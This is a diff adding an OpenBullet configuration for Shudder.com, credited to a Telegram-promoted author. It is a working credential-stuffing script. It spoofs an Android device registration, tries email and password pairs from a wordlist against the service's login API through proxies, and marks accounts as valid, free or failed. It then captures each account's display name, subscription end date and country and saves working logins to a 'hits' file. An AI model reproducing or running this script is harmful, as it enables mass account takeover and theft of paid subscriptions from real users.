@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "Shudder.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-16T22:20:50.1656102+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1184376072
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Rnd FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "Rnd" 
+
+#Get REQUEST POST "https://devices.amcsvod.io/v1/register" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: devices.amcsvod.io" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "X-Platform-Name: android" 
+  HEADER "X-Device-Id: <Rnd>" 
+  HEADER "X-Service-Name: shudder" 
+  HEADER "Content-Length: 0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.3" 
+  HEADER "X-Newrelic-Id: VQUGVVVaDxABXVNWAAYGUA==" 
+  HEADER "Connection: close" 
+
+#Login REQUEST POST "https://auth.amcsvod.io/v1/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: auth.amcsvod.io" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Authorization: Bearer <HEADERS(X-API-DEVICE-TOKEN)>" 
+  HEADER "X-Platform-Name: android" 
+  HEADER "X-Device-Id: <Rnd>" 
+  HEADER "X-Service-Name: shudder" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.3" 
+  HEADER "X-Newrelic-Id: VQUGVVVaDxABXVNWAAYGUA==" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password." 
+  KEYCHAIN Success OR 
+    KEY "display_name" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "subscriptions\": []," 
+
+#display_name PARSE "<SOURCE>" JSON "display_name" CreateEmpty=FALSE -> CAP "display_name" 
+
+#period_end_date PARSE "<SOURCE>" JSON "current_period_end_date" CreateEmpty=FALSE -> CAP "period_end_date" 
+
+#country PARSE "<SOURCE>" LR "official_name\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "Shudder.com hits.txt" Append "<USER>:<PASS>\\ndisplay_name: <display_name>\\nperiod_end_date: <period_end_date>\\ncountry: <country>\\nTelegram Channel: https://t.me/OpenBulletChannel\\n---------------------------------------------------------------\\n" -> VAR "Save" 
+
